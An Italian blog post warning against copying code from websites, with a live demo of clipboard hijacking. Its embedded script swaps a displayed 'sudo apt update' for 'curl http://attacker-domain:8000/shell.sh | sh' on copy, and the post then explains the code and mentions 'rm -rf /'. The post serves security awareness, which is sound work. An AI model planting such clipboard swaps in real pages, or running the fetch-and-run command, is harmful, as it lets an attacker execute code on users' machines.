---
layout: post
title: "Non copiare mai codice online! (ITA)"
date:   2022-07-30 11:00:58 +0100
categories: [hacking,ita]
tags: [hacking, shell, reverse shell, code, stackoverflow]
author: Perf
---

Programmatori, amministratori di sistema ed esperti nel settore informatico copiano e incollano centinaia e centinaia di righe di codice nei loro programmi o, ancora peggio, nella loro shell.

---

Recentemente, Gabriel Friedlander, Founder di una piattaforma di cybersecurity awareness, ha dimostrato che un ovvio (ma sorprendente) trucco ti farà pensare due volte prima di copiare e incollare codice da internet.

# Copia questo comando:

<span id="copy"><code> sudo apt update </code></span><br>
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\ncome puoi notare sono pure andato a capo, quindi nella tua shell avrei inviato automaticamente questo comando'); e.preventDefault(); });
</script>

<br>
<textarea style="height: 100px; min-height: 100px; width: 730px; min-width: 500px; resize: none;" cols="30" name="textarea" rows="5" placeholder="Incolla qui:"></textarea>
<br><br>
Tutto ciò è spaventoso e molto pericoloso, dato che anche i più esperti del settore cadrebbero in questo tranello.

# Ma come funziona?

## Il codice

```javascript

<script>
document.getElementById(‘copy’).addEventListener(‘copy’, function(e) { 
    e.clipboardData.setData(‘text/plain’, ‘curl http://attacker-domain:8000/shell.sh | sh\n’); e.preventDefault(); });
 </script>

```

Questo trucco è ancora molto poco conosciuto, quindi ti invito a condividerlo il più possibile per evitare che i tuoi amici o colleghi eseguano rm -rf / nei loro dispositivi 🙂
